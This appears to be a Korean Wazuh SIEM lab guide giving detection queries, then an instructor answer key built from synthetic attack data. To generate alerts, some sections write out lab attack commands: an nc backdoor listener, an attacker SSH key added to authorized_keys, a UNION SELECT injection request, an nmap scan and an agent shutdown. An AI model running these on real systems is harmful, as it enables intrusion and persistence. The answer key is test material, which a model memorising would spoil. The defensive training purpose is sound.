- **원본과 달라진 점**: 원본 DQL(rule.groups:vulnerability-detector AND data.vulnerability.*)은 0건 — 4.10 은 첫 스캔 결과를 알림으로 보내지 않는다. Inventory 화면에서 vulnerability.severity 로 검색. 매니저→인덱서 연결 설정 오류(0.0.0.0, 인증서 경로)도 kt66 에서 수정
  - 원본 DQL: `rule.groups:vulnerability-detector AND data.vulnerability.severity:(Critical or High)`
- **읽는 법**
  - vulnerability.severity:(Critical or High) — kt66 에서 176건(호스트 커널·npm 등)
  - agent.name·package.name·package.version·vulnerability.id(CVE) 컬럼으로 패치 목록을 만든다

### 52. 특정 CVE 노출 확인

- **결과**: — hits · 인덱스 `wazuh-states-vulnerabilities-* (Inventory 화면)`
- **구문 풀이**
  - `Inventory 검색창에 package.name:(*openssh* or *xz* or *log4j*)` — 공개된 제로데이가 있을 때 '우리 서버에 그 패키지가 있나'를 바로 확인
- **DQL**
```
package.name:(*openssh* or *xz* or *log4j*)   (Vulnerability Detection › Inventory)
```
- **원본과 달라진 점**: 필드 이름이 상태 인덱스 기준(package.name, vulnerability.id)으로 바뀜. 패키지 이름은 openssh-client 처럼 접미사가 붙어 와일드카드 필요
  - 원본 DQL: `data.vulnerability.cve:CVE-2024-3094 OR data.vulnerability.package.name:(xz or openssh or log4j*)`
- **읽는 법**
  - 결과 0건이면 미보유, 있으면 agent.name 목록이 우선 패치 대상
  - CVE 번호로 찾을 때는 vulnerability.id:CVE-2024-3094 처럼 정확히 적는다 (keyword)

### 53. SCA 보안 설정 점검 실패

- **결과**: 1291 hits · 인덱스 `wazuh-alerts-*`
- **구문 풀이**
  - `(공격 없음)` — SCA 는 에이전트가 CIS 벤치마크 항목을 스스로 점검해 보낸 결과
- **DQL**
```
rule.groups:sca AND data.sca.check.result:failed AND data.sca.check.title:(*SSH* or *password* or *root* or *firewall*)
```
- **읽는 법**
  - data.sca.check.title(점검 항목), data.sca.check.result failed
  - check.remediation 에 조치 방법까지 들어 있다

### 54. 루트킷·숨은 프로세스 (Rootcheck)

- **결과**: 204 hits · 인덱스 `wazuh-alerts-*`
- **구문 풀이**
  - `(공격 없음)` — Rootcheck 는 숨은 프로세스·포트, 변조된 시스템 파일, 위험한 권한을 주기적으로 점검
- **DQL**
```
rule.groups:rootcheck
```
- **원본과 달라진 점**: 원본 rule.description:hidden … 은 0건 — description 이 keyword 이고 문구도 고정. rule.groups:rootcheck 로 모은 뒤 full_log 로 구분
  - 원본 DQL: `rule.groups:rootcheck AND (rule.description:hidden OR rule.description:trojaned OR rule.description:rootkit)`
- **읽는 법**
  - kt66 에서는 '누구나 쓸 수 있는 파일' 같은 권한 문제(510)가 나온다 — 실제 루트킷은 재현하지 않는다
  - rule.description 은 모두 'Host-based anomaly detection event (rootcheck).' 로 같아서, 종류는 full_log(본문)에서 본다

### 55. VirusTotal 악성 파일 판정

- **결과**: 2 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
sudo docker exec -it kt66-web bash
root@web:/# echo '<EICAR 문자열>' > /var/www/html/uploads/invoice.pdf.exe
sudo docker exec kt66-web tail -2 /var/log/kt66-clamav.log
```
- **구문 풀이**
  - `echo '<EICAR>' > /var/www/html/uploads/invoice.pdf.exe` — 웹 업로드 폴더에 백신 테스트 파일을 둔다 (이름은 문서처럼 위장)
- **DQL**
```
rule.id:87105 OR rule.groups:virustotal
```
- **원본과 달라진 점**: VirusTotal 연동 설정(.env 의 VIRUSTOTAL_API_KEY). data.virustotal.positives 는 keyword 라 >= 3 같은 숫자 비교가 안 된다 → rule.id:87105 로 찾는다
  - 원본 DQL: `rule.id:87105 OR (rule.groups:virustotal AND data.virustotal.positives >= 3)`
- **읽는 법**
  - FIM 554 → 매니저가 파일 해시를 VirusTotal 에 조회 → 87105 '66 engines detected this file'
  - data.virustotal.source.file 경로, positives(탐지 엔진 수), permalink(상세 보고서)
  - 무료 API 키는 분당 4회 — FIM 이벤트가 몰리면 일부만 조회된다

### 56. ClamAV·백신 탐지

- **결과**: 1 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
sudo docker exec kt66-web tail -3 /var/log/kt66-clamav.log
```
- **구문 풀이**
  - `clamdscan (web 의 감시 루프, 20초마다)` — ClamAV 데몬에 파일 검사를 맡기는 명령. 감염 파일은 '경로: 시그니처 FOUND' 로 남긴다
- **DQL**
```
rule.groups:virus OR rule.id:52502
```
- **원본과 달라진 점**: kt66 보강: web 에 ClamAV(clamd+clamdscan) 설치, 결과를 syslog 형식으로 남겨 Wazuh 가 수집
- **읽는 법**
  - 52502 'ClamAV: Virus detected', full_log 에 Eicar-Test-Signature
  - 55번 VirusTotal 과 같은 파일이 두 엔진에서 모두 잡힌다 — 업로드 경로 확정

### 57. 에이전트 연결 끊김·중지 (탐지 회피)

- **결과**: 4 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
sudo docker stop kt66-fw
sudo docker start kt66-fw      # 복구 → 다시 연결되면 503
sudo ./kt66-net.sh   # fw 재기동 뒤 망 정책 재적용
```
- **구문 풀이**
  - `sudo docker stop kt66-fw → (100초) → sudo docker start kt66-fw` — 공격자가 에이전트를 멈춘 상황을 흉내. 컨테이너가 서면 에이전트도 같이 선다
- **DQL**
```
rule.id:(503 or 504 or 506) AND NOT agent.name:(test* or lab*)
```
- **원본과 달라진 점**: 끊김 판정을 10분 → 60초로 조정(재배포 시 '같은 이름 에이전트' 거부 문제도 해결). 503 을 함께 보도록 추가
  - 원본 DQL: `rule.id:(504 or 506) AND NOT agent.name:(test* or lab*)`
- **읽는 법**
  - 504 = 연결 끊김(매니저가 keepalive 가 끊긴 것을 스스로 기록), 503 = 다시 시작
  - 업무 시간에 멈춘 서버는 바로 확인. 직전 이벤트가 sudo 면 사람이 의도적으로 끈 것

### 59. Suricata IDS 알림 연계

- **결과**: 2 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
sudo nmap -sS -p 80,443,8001-8007 192.168.0.189
curl -s -o /dev/null -w "HTTP %{http_code}\n" -A "sqlmap/1.6.4" "http://dvwa.ccc.com/?id=1%20UNION%20SELECT%201,2--"
```
- **구문 풀이**
  - `nmap -sS / sqlmap User-Agent` — 네트워크 계층에서도 보이는 공격 — 스캔·도구 시그니처
- **DQL**
```
rule.groups:suricata AND NOT data.alert.category:"Not Suspicious Traffic"
```
- **원본과 달라진 점**: 원본의 data.alert.severity:1 조건은 kt66 로컬 룰(심각도 2~3)을 모두 지워 0건 → 제외
  - 원본 DQL: `rule.groups:suricata AND data.alert.severity:1 AND NOT data.alert.category:"Not Suspicious Traffic"`
- **읽는 법**
  - Suricata(IPS) eve.json 의 data.alert.signature, data.src_ip, data.alert.action(allowed/blocked)
  - 같은 IP 가 호스트 로그(16·31번)에도 있으면 네트워크·호스트 교차 검증 완료

### 60. MITRE ATT&CK 전술·기법별 보기

- **결과**: 204 hits · 인덱스 `wazuh-alerts-*`
- **구문 풀이**
  - `(앞의 실습들이 남긴 알림 전체)` — Wazuh 룰 대부분에 붙은 MITRE ATT&CK 전술·기법 태그로 묶어 본다
- **DQL**
```
rule.mitre.tactic:("Privilege Escalation" or "Credential Access" or "Persistence" or "Defense Evasion") AND rule.level >= 8
```
- **읽는 법**
  - rule.mitre.tactic·rule.mitre.id 를 Visualize → 어떤 기법이 많은지
  - 대시보드 MITRE ATT&CK 모듈 화면과 비교

### 61. 고위험 알림 전체 (일일 점검용)

- **결과**: 184 hits · 인덱스 `wazuh-alerts-*`
- **구문 풀이**
  - `(하루치 알림)` — 레벨 12 이상 = 즉시 조사
- **DQL**
```
rule.level >= 12 AND NOT rule.groups:(sca or vulnerability-detector or rootcheck)
```
- **읽는 법**
  - agent.name·rule.description·data.srcip 세 컬럼이면 하루치 점검표
  - Save 로 저장해 대시보드 패널로 올린다

### 62. osquery 로 리눅스 지속화 흔적 찾기 (새 실습)

- **결과**: 2 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
ssh ccc@192.168.0.189 'nc -lk 31338 &; echo "ssh-ed25519 AAAA… backdoor2@attacker" >> ~/.ssh/authorized_keys'
ssh ccc@192.168.0.189 'sed -i /backdoor2@attacker/d ~/.ssh/authorized_keys'   # 원복
```
- **구문 풀이**
  - `nc -lk 31338 &` — 새 리스닝 포트(백도어 흉내)
  - `echo '…backdoor2@attacker' >> ~/.ssh/authorized_keys` — 공격자 키 등록
- **DQL**
```
rule.groups:osquery AND agent.name:kt66-host AND data.osquery.name:(kt66_listening_ports or kt66_authorized_keys) AND data.osquery.action:added
```
- **원본과 달라진 점**: 새 실습 — osquery 를 kt66-host 에 설치하고 Wazuh osquery 모듈로 수집
- **읽는 법**
  - osquery 가 1분마다 'SELECT … FROM listening_ports / authorized_keys' 를 실행해 바뀐 행(added)만 Wazuh 로 보낸다 → 룰 24010
  - data.osquery.name(어떤 쿼리), data.osquery.columns.*(찾은 값)

### 63. osquery 로 Windows 지속화 흔적 찾기 (새 실습)

- **결과**: 105 hits · 인덱스 `wazuh-alerts-*`
- **실행한 명령**
```bash
osqueryi "SELECT name, path, source FROM startup_items WHERE name LIKE '%evil%';"
osqueryi "SELECT u.username, g.groupname FROM user_groups ug JOIN users u USING (uid) JOIN groups g USING (gid) WHERE g.groupname='Administrators';"
```
- **구문 풀이**
  - `osqueryi "SELECT name, path, source FROM startup_items …"` — osquery 는 운영체제를 SQL 표로 본다 — 같은 쿼리를 직접 실행해 확인
- **DQL**
```
rule.groups:osquery AND agent.name:windows-user AND data.osquery.name:(kt66_startup_items or kt66_local_admins or kt66_scheduled_tasks) AND data.osquery.action:added
```
- **원본과 달라진 점**: 새 실습 — Windows 에 osquery 설치(kt66 설치 스크립트)
- **읽는 법**
  - 37번 backdoor(관리자 그룹), 40번 kt66evil(예약 작업), 44번 evil(Run 키)이 '추가됨'으로 잡힌다
  - Sysmon 이 '언제 생겼나'(이벤트)를 보여준다면 osquery 는 '지금 무엇이 있나'(상태)를 보여준다

## 고급편 — 정답(강사용)

합성 데이터: `python3 analytics/kt66_synth.py --days 90 --seed 66` (기본값) → 45,199건. 같은 seed 면 같은 데이터가 만들어진다.

| 부류 | IP 수 | 건수 |
|---|---|---|
| scanner | 40 | 27,836 |
| normal | 171 | 15,972 |
| insider | 1 | 303 |
| attacker | 6 | 1,088 |

### 공격자 IP 프로파일 (Discover·Visualize 로 학생이 채울 값)

| IP | 국가 | 평판 | 건수 | 접근 일수 | 시스템 수 | 이벤트 종류 | 최대 레벨 | 업무외 비율 | 도달 단계 |
|---|---|---|---|---|---|---|---|---|---|
| 185.220.158.180 | Germany | 92 | 234 | 8 | 4 | 8 | 12 | 1.0 | recon → exploit → auth → access |
| 162.142.241.68 | United States | 8 | 232 | 8 | 4 | 8 | 12 | 0.58 | recon → exploit → auth → access |
| 222.186.74.165 | China | 88 | 201 | 8 | 4 | 8 | 12 | 1.0 | recon → exploit → auth → access |
| 185.56.193.253 | Netherlands | 76 | 199 | 5 | 4 | 7 | 12 | 1.0 | recon → exploit → auth |
| 118.123.50.105 | China | 81 | 201 | 5 | 4 | 7 | 12 | 1.0 | recon → exploit → auth |

- 185.220.158.180 · 162.142.241.68 · 222.186.74.165 는 access 뒤 privesc → persist → c2 → evasion 까지 간다. 이 단계 이벤트에는 출발지 IP 가 없어 **세션 스티칭**(같은 호스트·8시간 내 최근 로그인 IP)으로 이어 붙여야 한다.
- 185.56.193.253 · 118.123.50.105 는 auth(브루트포스)에서 멈춘다 — 상위 스캐너와 점수가 비슷하게 나오는 것이 정상(교훈 2).

### 이벤트 가중치 (가중 = 0.45×도달률 + 0.25×레벨/15 + 0.1×해외 + 0.1×평판/100 + 0.1×업무외)

| 룰 | 설명 | 레벨 | 건수 | IP 수 | 해외 | 평판 | 업무외 | 도달률 | 가중 |
|---|---|---|---|---|---|---|---|---|---|
| 31106 | A web attack returned code 200 (success). | 12 | 10 | 5 | 1.0 | 69 | 1.0 | 0.6 | 0.74 |
| 4151 | Multiple Firewall drop events from same source. | 10 | 15 | 5 | 1.0 | 69 | 0.8 | 0.6 | 0.69 |
| 86601 | Suricata: Alert - KT66 Possible nmap SYN scan | 6 | 18 | 6 | 0.83 | 68 | 0.83 | 0.67 | 0.63 |
| 5716 | sshd: authentication failed. | 5 | 408 | 6 | 1.0 | 66 | 1.0 | 0.5 | 0.57 |
| 5715 | sshd: authentication success. | 3 | 92 | 5 | 0.13 | 8 | 0.27 | 0.8 | 0.46 |
| 5712 | sshd: brute force trying to get access to the system. Non existent user. | 10 | 159 | 45 | 1.0 | 68 | 0.77 | 0.07 | 0.44 |
| 31151 | Multiple web server 400 error codes from same source ip. | 10 | 263 | 40 | 1.0 | 67 | 0.72 | 0.0 | 0.41 |
| 31103 | SQL injection attempt. | 6 | 1754 | 43 | 1.0 | 68 | 0.7 | 0.07 | 0.37 |
| 4101 | Firewall drop event. | 5 | 18432 | 45 | 1.0 | 68 | 0.72 | 0.07 | 0.35 |
| 5710 | sshd: Attempt to login using a non-existent user | 5 | 616 | 40 | 1.0 | 68 | 0.76 | 0.0 | 0.33 |
| 31101 | Web server 400 error code. | 5 | 7618 | 195 | 0.95 | 64 | 0.69 | 0.0 | 0.31 |
| 31100 | Access log messages grouped. | 3 | 15636 | 171 | 0.06 | 0 | 0.16 | 0.01 | 0.07 |

### 시간별 위험 상위 (위험 = Σ 레벨², 레벨 5 이상)

| 시각(KST) | risk | 건수 | IP 수 | 기여 1위 IP |
|---|---|---|---|---|
| 08-13(Thu) 18:00 | 5,418 | 203 | 4 | 118.227.140.146 |
| 09-08(Tue) 10:00 | 5,000 | 210 | 16 | 193.142.207.215 |
| 09-27(Sun) 16:00 | 4,275 | 171 | 8 | 185.188.124.97 |
| 10-29(Thu) 17:00 | 4,129 | 175 | 22 | 118.15.24.158 |
| 08-11(Tue) 11:00 | 4,103 | 159 | 11 | 103.7.248.24 |
| 08-06(Thu) 21:00 | 3,990 | 144 | 2 | 103.70.20.216 |
| 09-19(Sat) 15:00 | 3,975 | 153 | 7 | 185.188.124.97 |
| 09-08(Tue) 00:00 | 3,789 | 141 | 5 | 45.248.115.159 |
| 09-29(Tue) 00:00 | 3,750 | 151 | 6 | 103.7.248.24 |
| 08-28(Fri) 06:00 | 3,725 | 144 | 4 | 193.61.182.235 |

- 상위 10개 중 업무외 7개, 전체 risk 의 72% 가 업무외 시간.
